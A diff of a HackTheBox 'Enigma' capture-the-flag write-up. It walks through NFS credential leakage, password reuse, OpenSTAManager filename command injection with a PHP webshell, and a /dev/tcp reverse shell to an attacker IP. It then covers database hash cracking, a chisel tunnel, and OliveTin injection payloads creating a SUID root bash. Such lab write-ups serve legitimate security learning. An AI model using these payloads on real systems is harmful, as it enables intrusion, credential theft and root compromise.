@@ -1,313 +1,343 @@
-# HTB Enigma — Full Writeup
+# Enigma — HackTheBox Writeup
 
-**Difficulty:** Easy | **OS:** Linux | **Tools used:** curl only (no Metasploit, no Burp, no browser)
-
-> **Machine:**   Enigma
-> **Difficulty:** Easy  
-> **Platform:** Hack The Box  
-> **Date:** 11th May 2026  
-> **Prepared By:** ****  
-> **Machine Author(s):*****   
+**Platform:** HackTheBox  
+**Difficulty:** Easy  
+**OS:** Linux  
+**IP:** `$TARGET`  
+**Domain:** `enigma.htb`, `mail001.enigma.htb`, `support_001.enigma.htb`  
+**Tech Stack:** nginx, Dovecot (IMAP/POP3), NFS, OpenSTAManager 2.9.8, OliveTin, MySQL
 
 ---
 
-## 📋 Chain Overview
+## Attack Chain Overview
 
-Enigma is built around a realistic corporate scenario (Enigma Corp) involving:
-1. An open **NFS share** leaking new-employee onboarding info
-2. **Password reuse** across different accounts
-3. **Command injection** in OpenSTAManager (a real open-source web app)
-4. **Leaked credentials** inside config files
-5. A second **command injection** in OliveTin (a remote-management tool) leading to root
-
-This kind of multi-step exploitation is called **"chain exploitation"** — each step gives you a piece of information or a privilege that unlocks the next step.
+```
+NFS onboarding share
+   → PDF with kevin:Enigma2024! credentials
+   → Webmail credential pivot to sarah
+   → IT email leaks support portal creds
+   → OpenSTAManager RCE (CVE-2026-38751) → www-data shell
+   → MySQL config → bcrypt hash → hashcat → su haris
+   → OliveTin password-type injection (CVE-2026-27626) → RCE as root
+   → SUID bash copy → root
+```
 
 ---
 
-## Stage 1: NFS Discovery and Information Leak
+## Table of Contents
 
-### Command:
+1. [Reconnaissance](#1-reconnaissance)
+2. [NFS Share Enumeration](#2-nfs-share-enumeration)
+3. [Webmail Credential Pivot](#3-webmail-credential-pivot)
+4. [OpenSTAManager RCE — CVE-2026-38751](#4-openstamanager-rce--cve-2026-38751)
+5. [Linux Enumeration](#5-linux-enumeration)
+6. [Hash Extraction and Cracking](#6-hash-extraction-and-cracking)
+7. [Lateral Movement — su haris](#7-lateral-movement--su-haris)
+8. [Privilege Escalation — OliveTin CVE-2026-27626](#8-privilege-escalation--olivetin-cve-2026-27626)
+9. [Root Flag](#9-root-flag)
+10. [Key Takeaways](#10-key-takeaways)
+
+---
+
+## 1. Reconnaissance
+
+```bash
+nmap -sS -p- --min-rate 5000 -n -Pn $TARGET -oN silent
+nmap -sVC -p22,80,110,111,143,993,995,2049,36815,41307,42337,42629,51951 $TARGET -oN service
+```
+
+Key services identified:
+
+| Port | Service | Notes |
+|------|---------|-------|
+| 22 | SSH | OpenSSH 9.6p1 |
+| 80 | HTTP | nginx 1.24.0 |
+| 110/995 | POP3 | Dovecot |
+| 143/993 | IMAP | Dovecot |
+| 111/2049 | RPC/NFS | NFS share exposed |
+
+The presence of ports 111 and 2049 immediately signals an NFS share — always check for credential files or sensitive documents when an NFS export is accessible without auth.
+
+Related notes: [nmap](../../../tools/recon/nmap.md), [showmount](../../../tools/recon/showmount.md)
+
+---
+
+## 2. NFS Share Enumeration
+
+```bash
+showmount -e $TARGET
+# Output: /srv/nfs/onboarding
+```
+
+The export path `/srv/nfs/onboarding` hints at employee onboarding material — exactly the kind of share that leaks first-day credentials.
+
 ```bash
 mkdir /tmp/nfs_mount
-mount -t nfs <TARGET_IP>:/srv/nfs/onboarding /tmp/nfs_mount -o nolock
-pdftotext /tmp/nfs_mount/New_Employee_Access.pdf -
+sudo mount -t nfs $TARGET:/srv/nfs/onboarding /tmp/nfs_mount
+ls -la /tmp/nfs_mount
 ```
 
-### Explanation:
-**NFS (Network File System)** is a protocol for sharing files over a network — think of it like a "shared USB drive" between machines. The issue here is a **misconfiguration**: the share was open with no authentication at all — anyone could `mount` it with no username or password.
+Inside the mount: a PDF for a new employee containing plaintext credentials:
 
-Inside, we found a PDF containing onboarding info for a new employee (Kevin), including his email username and password.
+```
+Employee:  Kevin Mitchell
+URL:       http://mail001.enigma.htb
+Username:  kevin
+Password:  Enigma2024!
+```
 
-**The vulnerability:** Exposed NFS Share (an NFS service exposed with no access control) — a common real-world misconfiguration, not a bug in NFS itself.
+Add vhosts to `/etc/hosts`:
+
+```bash
+echo "$TARGET enigma.htb mail001.enigma.htb support_001.enigma.htb" | sudo tee -a /etc/hosts
+```
+
+Full technique: [nfs-share-abuse](../../../exploits/network-services/nfs-share-abuse.md)
 
 ---
 
-## Stage 2: Mail Access via IMAP
+## 3. Webmail Credential Pivot
 
-### Command:
-```bash
-curl -s --url "imaps://<TARGET_IP>/" --user "kevin:Enigma2024!" -k
-curl -s --url "imaps://<TARGET_IP>/INBOX/;MAILINDEX=1" --user "kevin:Enigma2024!" -k
+Logged into `http://mail001.enigma.htb` as `kevin:Enigma2024!`. Kevin's inbox had an email addressed to `sarah`. Tried the same password for sarah — it worked (credential reuse between the same org).
+
+Sarah's inbox had a message from IT Support with the support portal URL:
+
 ```
-
-### Explanation:
-Instead of using a web interface (Roundcube webmail), we used `curl` to talk directly to the **IMAP** protocol (a mail-reading protocol). This is much lighter and doesn't require a browser.
-
-Inside Kevin's mailbox, we found a welcome email from an employee named **Sarah** in the Accounts department — this gave us a new username to try.
-
-### Command (testing password reuse):
-```bash
-curl -s --url "imaps://<TARGET_IP>/" --user "sarah:Enigma2024!" -k
-curl -s --url "imaps://<TARGET_IP>/INBOX/;MAILINDEX=1" --user "sarah:Enigma2024!" -k
-```
-
-### Explanation:
-We tried Kevin's **exact same** password (`Enigma2024!`) against the username `sarah` — and it worked! This is called **Password Reuse**. In real companies this happens a lot: one "onboarding" default password gets handed out to multiple employees and nobody changes it.
-
-Inside Sarah's inbox, we found an email from IT containing full admin credentials for a business application (OpenSTAManager):
-```
+URL:      http://support_001.enigma.htb
 Username: admin
 Password: Ne3s4rtars78s
 ```
 
----
-
-## Stage 3: Logging into OpenSTAManager
-
-### Command:
-```bash
-curl -v -c cookies.txt --resolve support_001.enigma.htb:80:<TARGET_IP> \
-  -d "username=admin&password=Ne3s4rtars78s" \
-  http://support_001.enigma.htb/?op=login
-```
-
-### Explanation:
-- `--resolve` makes curl resolve the hostname directly to an IP, as an alternative to editing `/etc/hosts`
-- `-c cookies.txt` saves the session cookie so we can reuse it on later requests (staying "logged in")
-- The response `302 Found` with `Location: /controller.php` confirmed the login succeeded
-
-**Note:** OpenSTAManager is a real open-source app for e-invoicing and business management, used by real companies (especially in Italy).
+**Why this mattered:** IMAP/webmail is routinely overlooked during initial enumeration. When multiple mail users share a password and you can enumerate usernames from email headers, credential spraying across all visible mailboxes is always worth trying.
 
 ---
 
-## Stage 4: Command Injection via File Upload (CVE)
+## 4. OpenSTAManager RCE — CVE-2026-38751
 
-This is the most important vulnerability in the whole chain, and worth understanding well.
+The support portal at `http://support_001.enigma.htb` ran **OpenSTAManager v2.9.8**. Version confirmed at:
 
-### Understanding the bug first:
-
-OpenSTAManager has an "Import ZIP" feature (for importing electronic invoices as ZIP files). The app extracts files from the ZIP and uses the **filename** directly inside a shell command, without sanitizing it.
-
-That means if a filename inside the ZIP contains special shell characters like `;` or `"`, those characters get executed as real shell commands instead of being treated as plain text.
-
-### Building the exploit:
-```python
-import zipfile
-
-cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
-malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'
-
-with zipfile.ZipFile('/root/exploit.zip', 'w') as zf:
-    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
+```
+http://support_001.enigma.htb/modules/utenti/info.php
 ```
 
-### Detailed explanation:
-The filename we built is:
-```
-invoice.p7m";cd files && echo '<?php system($_GET["c"]); ?>' > SHELL.php;echo ".p7m
-```
+Exploited with a public PoC:
 
-When the app tries to use this filename inside a shell command (something like `mv "invoice.p7m" ...`), the `"` breaks out of the string, and a new command appears:
 ```bash
-cd files && echo '<?php system($_GET["c"]); ?>' > SHELL.php
+git clone https://github.com/b0ySie7e/OpenSTAManager-RCE-Exploit-CVE-2026-38751
+cd OpenSTAManager-RCE-Exploit-CVE-2026-38751
+cargo build --release
+
+./openstamanager-rce-exploit \
+  --url http://support_001.enigma.htb \
+  -U admin -P Ne3s4rtars78s \
+  --lhost 10.10.15.26 --lport 4444
 ```
 
-This command moves into the `files/` directory and writes a small PHP file called `SHELL.php` containing:
-```php
-<?php system($_GET['c']); ?>
-```
-This PHP code accepts a `c` parameter from the URL and executes it as a system command — meaning anyone who visits `SHELL.php?c=<command>` gets that command executed on the server.
+Reverse shell received as `www-data`. Stabilized:
 
-### Uploading the file:
 ```bash
-curl -v -b cookies.txt --resolve support_001.enigma.htb:80:<TARGET_IP> \
-  -F "op=restore" \
-  -F "blob=@/root/exploit.zip;type=application/zip" \
-  "http://support_001.enigma.htb/actions.php?id_module=7"
+# Ctrl+Z
+stty raw -echo; fg
+# When prompted for terminal type:
+export TERM=xterm SHELL=bash
 ```
 
-- `-F` builds a multipart/form-data request (like a browser file upload)
-- `op=restore` and `blob` are the field names we discovered by reading the HTML of the Backup page
-
-### Confirming success:
-```bash
-curl -s --resolve support_001.enigma.htb:80:<TARGET_IP> \
-  "http://support_001.enigma.htb/files/SHELL.php?c=id"
-```
-**Result:** `uid=33(www-data) gid=33(www-data) groups=33(www-data)` ✅
-
-**Vulnerability type:** Filename-based Command Injection — also known as **Arbitrary File Write leading to RCE**.
+Full technique: [openstamanager-rce-cve-2026-38751](../../../exploits/web-rce/openstamanager-rce-cve-2026-38751.md)
 
 ---
 
-## Stage 5: Getting a Full Reverse Shell
+## 5. Linux Enumeration
 
-### Command (in a second terminal, listener):
 ```bash
-nc -lvnp 4444
+cat /etc/passwd | grep bash
+# haris:x:1000:1000:...:/home/haris:/bin/bash
 ```
 
-### Command (sending the payload):
+Found the application config file with database credentials:
+
 ```bash
-curl -s "http://support_001.enigma.htb/files/SHELL.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/4444+0>%261'" \
-  --resolve support_001.enigma.htb:80:<TARGET_IP>
+cat config.inc.php
+# $db_username = 'brollin'
+# $db_password = 'Fri3nds@9099'
+# $db_name = 'openstamanager'
 ```
 
-### Explanation:
-The webshell (`SHELL.php?c=id`) lets us run one command at a time and see the output, but it's not practical for sustained work. A **Reverse Shell** is a technique where the target server "connects back" to us (instead of us connecting to it), giving us a full interactive terminal.
-
-- `nc -lvnp 4444` puts our machine into "listening" mode on port 4444
-- The payload tells the server: open an interactive bash and pipe it into a connection to our IP and port
-- `/dev/tcp/...` is a bash feature that opens a raw TCP connection without needing netcat on the target
-
-Once the server executes this, it "calls back" to us, and we land in a real shell as `www-data`.
+Web application config files (especially `config.inc.php`, `config.php`, `.env`, `wp-config.php`) almost always contain DB credentials. Always cat them early.
 
 ---
 
-## Stage 6: Discovering Database Credentials
+## 6. Hash Extraction and Cracking
 
-### Command:
+Logged into MySQL with the recovered credentials and extracted `haris`'s bcrypt hash:
+
 ```bash
-cat /var/www/html/openstamanager/config.inc.php
+mysql -u brollin -p'Fri3nds@9099' -h localhost openstamanager
+SELECT username, password FROM zz_users WHERE username = 'haris';
+# $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
 ```
 
-### Explanation:
-Web app config files very often contain database credentials in plaintext. It's poor security practice, but extremely common in real applications.
+Saved and cracked with hashcat (mode 3200 = bcrypt):
 
-We found:
-```
-db_username = 'brollin'
-db_password = 'Fri3nds@9099'
-```
-
-### Extracting password hashes:
 ```bash
-mysql -u brollin -p'Fri3nds@9099' openstamanager -e "SELECT username, password FROM zz_users;"
+echo '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > hash_haris.txt
+hashcat -m 3200 -a 0 hash_haris.txt /usr/share/wordlists/rockyou.txt --force
+# Result: bestfriends
 ```
 
-**Result:**
-```
-admin: $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
-haris: $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
-```
-
-These are **bcrypt hashes** — one-way encryption of passwords. To recover the original password, you'd normally "crack" them with tools like `hashcat` against a wordlist (e.g. rockyou.txt). This process can take a long time depending on hardware.
+Related notes: [mysql](../../../tools/database/mysql.md), [hashcat](../../../tools/creds/hashcat.md)
 
 ---
 
-## Stage 7: Pivoting to a System User (haris)
+## 7. Lateral Movement — su haris
 
-### Command:
+SSH was restricted to key-based auth only. Switched user directly from the www-data shell:
+
 ```bash
-printf 'bestfriends\n' | su haris -c 'id'
+su haris
+# password: bestfriends
+cat /home/haris/user.txt
 ```
 
-### Explanation:
-Many systems (especially ones using **Dovecot** or PAM with `auth-system`) tie the application's password to the actual Linux user password. This means the password `haris` used inside OpenSTAManager was the same one for his Linux login on the server.
-
-`su haris -c 'id'` switches to the `haris` user and runs a single command (`id`) with his privileges. `printf 'bestfriends\n' |` feeds the password automatically instead of typing it manually each time.
-
-**Result:** `uid=1000(haris)` ✅ — this got us the **User Flag**:
-```bash
-printf 'bestfriends\n' | su haris -c 'cat haris/user.txt'
-```
+**User flag captured.**
 
 ---
 
-## Stage 8: Privilege Escalation via OliveTin (Root)
+## 8. Privilege Escalation — OliveTin CVE-2026-27626
 
-This is the most critical vulnerability on the box.
+### Discovery
 
-### Understanding OliveTin:
-OliveTin is an app that provides a simple web UI for running predefined shell commands — like a set of "buttons" that each trigger a script. The catch: this instance was running as **root**, and was bound only to `127.0.0.1:1337` (not reachable from the internet, only from within the server itself).
+```bash
+ls /opt/OliveTin/
+ps aux | grep -i olive
+# root  1520  /usr/local/bin/OliveTin
+```
 
-### The bug in the config:
+OliveTin was running as **root** on `127.0.0.1:1337`. The real config was at `/etc/OliveTin/config.yaml`.
+
+### Port Forwarding with Chisel
+
+To access the OliveTin web UI from the attacker machine:
+
+```bash
+# Attacker machine
+chisel server -p 8888 --reverse
+
+# Target machine (from haris shell)
+./chisel client 10.10.15.26:8888 R:1337:127.0.0.1:1337
+```
+
+Browsed to `http://127.0.0.1:1337` on the attacker machine.
+
+Related notes: [chisel](../../../tools/pivot/chisel.md)
+
+### Identifying the Vulnerable Action
+
+Using browser DevTools → Network tab, we found the `Backup Database` action config:
+
 ```yaml
 - title: Backup Database
   id: backup_database
   shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
   arguments:
+    - name: db_user
+      type: ascii_identifier
     - name: db_pass
-      type: password
+      type: password      # <-- NOT validated by checkShellArgumentSafety
+    - name: db_name
+      type: ascii_identifier
 ```
 
-Notice: `{{ db_pass }}` gets inserted directly inside the shell command's single quotes (`'...'`) **with no sanitization at all**. This is called an **Unsanitized Template Injection**, or **Shell Command Injection via Template**.
+The argument `db_pass` has type `password`. Per **CVE-2026-27626**, OliveTin's `checkShellArgumentSafety` function does not validate arguments of type `password`, allowing shell metacharacter injection.
 
-### Building the payload:
+### API Discovery
+
+OliveTin uses a **gRPC/Connect** protocol — not plain REST. The endpoint discovered via DevTools:
+
 ```
-x'; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #
+POST /api/olivetin.api.v1.OliveTinApiService/StartAction
 ```
 
-### Detailed explanation:
-If we submit this string as `db_pass`, the final command that runs becomes:
+A `uniqueTrackingId` field is also required; without it the server returns `notfound`.
+
+### RCE Verification
+
+The injection payload closes the single-quoted password argument (`'`), appends arbitrary commands, then comments out the rest with `#`:
+
 ```bash
-mysqldump -u backup_svc -p'x'; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #' production > ...
-```
-
-How it works:
-1. `-p'x'` — closes the quote early; `mysqldump` fails with a bad password (irrelevant to us)
-2. `;` — starts a **brand new, separate command**
-3. `cp /bin/bash /tmp/rootbash` — copies bash into a new file
-4. `chmod 4755 /tmp/rootbash` — sets the **SUID bit** (the leading `4`) on the file, so anyone who runs it gets the privileges of the file's **owner** (root, since OliveTin runs as root)
-5. `#` — turns the rest of the original command into a comment so there's no syntax error
-
-### Executing the exploit via the API:
-```bash
-curl -s -X POST http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait \
+curl -X POST http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction \
   -H "Content-Type: application/json" \
-  -d '{"actionId":"backup_database","arguments":[
-    {"name":"db_user","value":"backup_svc"},
-    {"name":"db_pass","value":"x'"'"'; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #"},
-    {"name":"db_name","value":"production"}
-  ]}'
+  -d '{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"backup_svc"},{"name":"db_pass","value":"'"'"'; id > /tmp/rce_test #"},{"name":"db_name","value":"production"}],"uniqueTrackingId":"ffffffff-0000-0000-0000-000000000003"}'
+
+cat /tmp/rce_test
+# uid=0(root) gid=0(root) groups=0(root)
 ```
 
-### Verifying:
+The resulting executed shell command is:
+
+```bash
+mysqldump -u backup_svc -p''; id > /tmp/rce_test #' production > /opt/backups/backup.sql
+```
+
+### Root Shell via SUID Bash
+
+Outbound connections were blocked by a firewall. Instead, copied bash with the SUID bit set so any user can spawn a root shell:
+
+```bash
+curl -X POST http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction \
+  -H "Content-Type: application/json" \
+  -d '{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"backup_svc"},{"name":"db_pass","value":"'"'"'; cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash #"},{"name":"db_name","value":"production"}],"uniqueTrackingId":"ffffffff-0000-0000-0000-000000000005"}'
+```
+
 ```bash
 ls -la /tmp/rootbash
-# -rwsr-xr-x 1 root root 1446024 ... /tmp/rootbash
+# -rwsr-xr-x 1 root root ... /tmp/rootbash
+
+/tmp/rootbash -p
+# rootbash-5.2# id
+# uid=1000(haris) gid=1000(haris) euid=0(root) egid=0(root)
 ```
 
-The `s` instead of `x` in `rws` confirms the SUID bit is set, and the owner is `root`.
+Full technique: [olivetin-cmd-injection-cve-2026-27626](../../../exploits/web-rce/olivetin-cmd-injection-cve-2026-27626.md)
 
-### Getting root:
+---
+
+## 9. Root Flag
+
 ```bash
-/tmp/rootbash -p -c "id; cat /root/root.txt"
+cat /root/root.txt
 ```
 
-The `-p` flag tells bash to "preserve" elevated privileges instead of dropping them automatically, which is bash's default safety behavior.
-
-**Result:** `uid=0(root)` — Root flag obtained ✅
+**Root flag captured.**
 
 ---
 
-## 🎯 Summary of Vulnerabilities Exploited
+## 10. Key Takeaways
 
-| # | Vulnerability | Type | Impact |
-|---|---|---|---|
-| 1 | NFS share with no authentication | Misconfiguration | Information disclosure |
-| 2 | Password reuse | Weak Credential Management | Access to second account |
-| 3 | Filename-based command injection | CWE-78 (OS Command Injection) | RCE as www-data |
-| 4 | Config file with plaintext credentials | Sensitive Data Exposure | Database access |
-| 5 | Shared password (app + Linux user) | Weak Credential Management | System user access |
-| 6 | Unsanitized shell template (`db_pass`) | CWE-78 (OS Command Injection) | Privilege escalation to root |
+1. **NFS onboarding shares leak credentials.** Always enumerate ports 111/2049 and mount any export with `showmount -e`. PDFs, Word docs and README files inside are the primary targets.
+2. **Credential reuse is rampant.** After you crack one account, try the same password on every other account/service visible in the environment (mailboxes, SSH, support portals).
+3. **Internal services run as root.** `OliveTin`, `php -S`, and similar "convenience" daemons are frequently misconfigured to run as root. Always enumerate internal ports with `ss -tulpn` or `netstat -tulpn`.
+4. **Argument type ≠ validation.** Naming a field `password` in OliveTin's config is not a security boundary — it's a trust signal that skips safety checks. Never conflate data classification with input validation.
+5. **When reverse shells are blocked, SUID bash is a reliable out.** `cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash` is one of the cleanest RCE-to-root patterns when direct netcat callbacks fail.
+6. **chisel + gRPC APIs.** When you need to interact with a local service, a chisel R-tunnel is the cleanest approach — paired with browser DevTools to reconstruct the correct endpoint and required fields.
 
 ---
 
-## 💡 Key Takeaways
+## CVEs
 
-1. **Always try password reuse** — any password you find, test it against every other discovered account
-2. **Read the source code / config files** — the OliveTin bug was only found by reading the YAML config
-3. **Filename injection** is a common bug class in apps that extract ZIP files — always be suspicious of how an app handles filenames
-4. **The SUID bash trick** (`cp /bin/bash; chmod 4755`) is a classic privilege escalation technique, useful anywhere you have command injection running with elevated privileges
-5. **curl alone is enough** to exploit the vast majority of scenarios — you rarely need heavy tools or a browser
+| CVE | Application | Description |
+|-----|-------------|-------------|
+| CVE-2026-38751 | OpenSTAManager 2.9.8 | Authenticated RCE |
+| CVE-2026-27626 | OliveTin | OS Command Injection via `password` argument type bypassing `checkShellArgumentSafety` |
+
+---
+
+## Related Notes
+
+- [nfs-share-abuse](../../../exploits/network-services/nfs-share-abuse.md)
+- [openstamanager-rce-cve-2026-38751](../../../exploits/web-rce/openstamanager-rce-cve-2026-38751.md)
+- [olivetin-cmd-injection-cve-2026-27626](../../../exploits/web-rce/olivetin-cmd-injection-cve-2026-27626.md)
+- [chisel](../../../tools/pivot/chisel.md)
+- [mysql](../../../tools/database/mysql.md)
+- [hashcat](../../../tools/creds/hashcat.md)
+- [showmount](../../../tools/recon/showmount.md)
+- [nmap](../../../tools/recon/nmap.md)
